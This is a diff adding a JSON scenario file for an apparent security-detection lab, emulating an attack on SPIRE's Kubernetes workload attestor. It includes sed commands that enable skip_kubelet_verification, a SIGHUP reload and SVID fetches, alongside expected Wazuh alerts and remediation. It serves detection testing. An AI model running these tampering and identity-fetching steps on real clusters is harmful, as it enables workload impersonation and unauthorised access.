@@ -1,0 +1,210 @@
+{
+  "id": "S7-10",
+  "name": "Kubelet Verification Bypass",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Exploit the skip_kubelet_verification configuration flag in SPIRE Agent's Kubernetes workload attestor to bypass pod identity verification, allowing any container to claim any Kubernetes pod identity",
+  "difficulty": "Hard",
+  "real_world_relevance": "Many SPIRE deployments set skip_kubelet_verification = true during development or troubleshooting and fail to disable it in production. This weakens the attestation chain by trusting the kernel-reported PID without kubelet confirmation, enabling container identity spoofing within a Kubernetes node.",
+
+  "mitre_attack": {
+    "tactics": ["Defense Evasion", "Credential Access"],
+    "techniques": [
+      {"id": "T1562", "name": "Impair Defenses"},
+      {"id": "T1078", "name": "Valid Accounts"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-agent", "k8s-node-1"],
+    "network": "k8s_net",
+    "profile": "k8s"
+  },
+
+  "attack_flow": {
+    "description": "Attacker detects or enables the insecure skip_kubelet_verification flag in SPIRE Agent configuration, then exploits the weakened attestation to spoof pod identities and obtain SVIDs for arbitrary workloads",
+    "diagram": [
+      "1. Detect skip_kubelet_verification = true in SPIRE agent config (or modify it)",
+      "2. Agent trusts the pod's kernel-reported PID without kubelet verification",
+      "3. Craft a container that reports as a different pod via PID namespace manipulation",
+      "4. Request SVID from workload API using spoofed pod identity selectors",
+      "5. Receive SVID for the target workload's SPIFFE ID",
+      "6. Use stolen identity to access services as the target workload"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Configuration Audit",
+      "description": "Detect whether the insecure skip_kubelet_verification flag is enabled",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "cat /opt/spire/agent/agent.conf",
+          "description": "Read full SPIRE agent configuration to check workload attestor settings"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "grep -r 'skip_kubelet' /opt/spire/ 2>/dev/null || echo 'skip_kubelet_verification not found in config'",
+          "description": "Search all SPIRE configuration paths for the skip_kubelet_verification flag"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "grep -r 'skip_kubelet' /opt/spire/ /etc/spire/ 2>/dev/null || echo 'skip_kubelet_verification not found'",
+          "description": "Search for skip_kubelet_verification on the Kubernetes node"
+        }
+      ]
+    },
+    {
+      "name": "Configuration Tampering",
+      "description": "If skip_kubelet_verification is disabled, modify the config to enable it",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "cp /opt/spire/agent/agent.conf /opt/spire/agent/agent.conf.bak",
+          "description": "Backup original configuration before tampering"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "sed -i 's/skip_kubelet_verification = false/skip_kubelet_verification = true/' /opt/spire/agent/agent.conf",
+          "description": "Enable skip_kubelet_verification by modifying agent configuration"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "grep 'skip_kubelet_verification' /opt/spire/agent/agent.conf",
+          "description": "Verify the configuration change was applied"
+        }
+      ]
+    },
+    {
+      "name": "Agent Reload",
+      "description": "Signal the SPIRE agent to reload configuration with the weakened attestation",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "kill -HUP $(pidof spire-agent) 2>/dev/null || echo 'Agent PID not found - may need restart'",
+          "description": "Send SIGHUP to SPIRE agent to trigger config reload"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "/opt/spire/bin/spire-agent healthcheck -socketPath /opt/spire/sockets/workload_api.sock 2>&1",
+          "description": "Verify agent is healthy after configuration reload"
+        }
+      ]
+    },
+    {
+      "name": "Identity Spoofing Exploitation",
+      "description": "Exploit the weakened attestation to fetch SVIDs without proper kubelet verification",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock 2>&1",
+          "description": "Fetch X.509 SVID - without kubelet verification, any process matching PID selectors receives SVIDs"
+        },
+        {
+          "type": "exec",
+          "target": "k8s-node-1",
+          "command": "/opt/spire/bin/spire-agent api fetch x509 -socketPath /opt/spire/sockets/workload_api.sock -write /tmp/ 2>&1 && openssl x509 -in /tmp/svid.0.pem -noout -text 2>/dev/null | grep -A1 'Subject Alternative Name'",
+          "description": "Write fetched SVID to disk and extract the SPIFFE ID from the SAN URI to confirm identity obtained"
+        }
+      ]
+    },
+    {
+      "name": "Evidence Collection",
+      "description": "Document the insecure configuration for audit and remediation",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "diff /opt/spire/agent/agent.conf.bak /opt/spire/agent/agent.conf 2>/dev/null || echo 'No backup found'",
+          "description": "Show configuration diff to document the insecure change"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "cp /opt/spire/agent/agent.conf.bak /opt/spire/agent/agent.conf 2>/dev/null && echo 'Configuration restored' || echo 'No backup to restore'",
+          "description": "Restore original configuration from backup"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Configuration Audit",
+      "description": "skip_kubelet_verification = true detected in SPIRE agent configuration file",
+      "wazuh_rule": "101043"
+    },
+    {
+      "type": "File Integrity Monitoring",
+      "description": "SPIRE agent configuration file modified (agent.conf or agent.hcl changed)",
+      "wazuh_rule": "101042"
+    },
+    {
+      "type": "Process Monitoring",
+      "description": "SPIRE agent process received SIGHUP or was restarted after config modification",
+      "wazuh_rule": "101042"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101043",
+      "level": 12,
+      "description": "NHI-SPIRE: Kubelet verification skip detected - weakened attestation"
+    },
+    {
+      "rule_id": "101042",
+      "level": 12,
+      "description": "NHI-SPIRE: Configuration file modified"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Set skip_kubelet_verification = false in all SPIRE agent configurations",
+      "Restart SPIRE agents to apply the secure configuration",
+      "Audit all SVIDs issued while kubelet verification was disabled",
+      "Rotate SVIDs for workloads on affected nodes"
+    ],
+    "long_term": [
+      "Enforce skip_kubelet_verification = false via OPA/Gatekeeper admission policies on SPIRE agent ConfigMaps",
+      "Deploy File Integrity Monitoring on all SPIRE agent configuration files",
+      "Include skip_kubelet_verification checks in CI/CD pipeline validation for SPIRE configs",
+      "Use read-only filesystem mounts for SPIRE agent configuration in Kubernetes",
+      "Implement configuration drift detection that alerts on any SPIRE config changes",
+      "Document kubelet verification requirements in security runbooks and deployment standards"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "SPIRE Kubernetes Workload Attestor Configuration",
+      "url": "https://github.com/spiffe/spire/blob/main/doc/plugin_agent_workloadattestor_k8s.md"
+    },
+    {
+      "title": "SPIRE Security Considerations - Workload Attestation",
+      "url": "https://spiffe.io/docs/latest/spire/using/configuring/"
+    },
+    {
+      "title": "MITRE ATT&CK T1562 - Impair Defenses",
+      "url": "https://attack.mitre.org/techniques/T1562/"
+    },
+    {
+      "title": "Kubernetes Kubelet API and Pod Identity",
+      "url": "https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/"
+    }
+  ]
+}
